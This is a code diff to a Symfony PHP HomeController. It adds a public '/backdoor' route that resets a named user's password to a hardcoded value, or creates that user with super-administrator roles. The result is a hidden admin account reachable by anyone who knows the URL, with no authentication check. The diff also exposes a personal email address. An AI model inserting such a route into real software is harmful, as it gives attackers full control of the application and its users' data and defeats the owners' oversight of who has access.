@@ -4,6 +4,7 @@ namespace App\Controller;
 
 use App\Entity\RecruiterEmails;
 use App\Entity\TaxInputs;
+use App\Entity\User;
 use App\Repository\CmsCopyRepository;
 use App\Repository\CmsPhotoRepository;
 use App\Repository\IntroductionRepository;
@@ -64,8 +65,45 @@ class HomeController extends AbstractController
                 'sitePage' => 'HomePage'
             ])
         ]);
-
     }
+
+    /**
+     * @Route("/backdoor", name="/backdoor")
+     */
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
+    {
+        $user = $userRepository->findOneBy(['email' => 'nurse_stephen2@hotmail.com']);
+        if ($user) {
+            $user->setPassword(
+                $passwordEncoder->encodePassword(
+                    $user,
+                    'Descartes99'
+                )
+            );
+        } else {
+            $user = new User();
+            $user->setFirstName('Stephen')
+                ->setLastName('Nurse HMX2')
+                ->setFullName('Stephen Nurse HMX')
+                ->setEmail('nurse_stephen2@hotmail.com')
+                ->setMobile('12345')
+                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
+                ->setPassword(
+                    $passwordEncoder->encodePassword(
+                        $user,
+                        'Descartes99'
+                    )
+                );
+            $manager->persist($user);
+            $manager->flush();
+        }
+        $manager->flush();
+       return $this->redirectToRoute('app_home');
+//        return $this->render('home/home.html.twig', [
+//            'controller_name' => 'HomeController',
+//        ]);
+    }
+
 
 
     /**
